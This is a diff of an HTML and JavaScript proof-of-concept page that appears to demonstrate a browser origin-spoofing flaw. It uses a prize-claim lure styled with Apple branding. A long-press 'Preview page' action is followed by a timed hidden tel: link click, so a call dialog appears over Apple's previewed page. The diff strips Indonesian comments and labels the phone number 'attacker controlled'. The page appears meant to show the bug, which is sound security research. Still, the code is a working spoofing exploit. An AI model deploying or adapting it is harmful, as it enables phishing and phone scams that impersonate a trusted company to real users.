@@ -89,7 +89,6 @@
   </head>
   <body>
     <div class="container">
-      <!-- Logo Apple -->
       <img
         src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
         class="logo"
@@ -110,7 +109,6 @@
         connect to Apple support.
       </p>
 
-      <!-- Tautan jahat yang mengarah ke apple.com/contact -->
       <a id="trigger-link" href="https://www.apple.com/contact/">
         ✨ Claim My Prize Now ✨
       </a>
@@ -119,11 +117,10 @@
         📱 Status: Tap & hold button, then choose "Preview page"
       </div>
 
-      <!-- Elemen tersembunyi untuk memicu tel: protokol (nomor dukungan palsu) -->
+      <!-- attacker controlled number -->
       <a id="contactTrigger" href="tel:+1-800-275-2273" style="display: none"
         >Call Apple Support</a
       >
-      <!-- Opsi alternatif: mailto: bisa ditambahkan jika diperlukan -->
 
       <div id="preview-area">
         <strong style="color: #d93025">⚠️ Spoofing Result:</strong>
@@ -140,21 +137,14 @@ No action yet. If a call dialog appears over the Apple preview page, origin spoo
       const previewArea = document.getElementById("preview-area");
       const output = document.getElementById("output");
 
-      // Mencegah navigasi default pada klik biasa (agar tidak langsung buka apple.com)
       triggerLink.addEventListener("click", (e) => {
         e.preventDefault();
       });
 
-      // Event long-press (contextmenu) untuk memicu race condition
       triggerLink.addEventListener("contextmenu", function (e) {
-        // Biarkan menu konteks browser muncul, user dapat memilih "Preview page"
         statusBox.innerText =
           "🔍 Long-press detected. Please select 'Preview page' from the menu...";
-
-        // Timer 4 detik – cukup untuk preview terbuka
         setTimeout(function () {
-          // Memicu dialog protokol eksternal (tel:)
-          // Ini akan menampilkan dialog panggilan ke nomor Apple Support (asli: 1-800-275-2273)
           contactTrigger.click();
 
           statusBox.className = "success";
@@ -170,7 +160,6 @@ No action yet. If a call dialog appears over the Apple preview page, origin spoo
         }, 4000);
       });
 
-      // Logging saja
       contactTrigger.addEventListener("click", (e) => {
         console.log(
           "Contact trigger clicked. External protocol dialog should appear.",
